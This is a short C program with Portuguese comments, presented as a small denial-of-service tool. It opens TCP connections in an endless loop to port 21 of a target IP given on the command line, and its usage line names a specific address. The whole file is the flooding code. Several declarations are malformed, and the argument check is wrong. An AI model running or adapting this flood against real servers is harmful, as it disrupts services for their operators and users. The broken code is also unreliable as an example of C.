// Um pequeno DOS em C
//
//
#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char argv[]){


        if(argc < 1){
                printf("Modo de uso:\n./dos 37.59.225.48");
        }

        else{

                int meusockets;
                int conecta;
                struct sockaddr_in alvo;
                chardestino;
                destino = argv[1];


                for(;;){

                        meusockets = socket(AF_INET, SOCK_STREAM, 0);
                        alvo.sin_family = AF_INET;
                        alvo.sin_port = htons(21);
                        alvo.sin_addr.s_addr = inet_addr(destino);

                        conecta = connect(meusockets, (struct sockaddr *)&alvo, sizeof alvo);
                        printf(":) CONECTANDO");


                }

        }

}
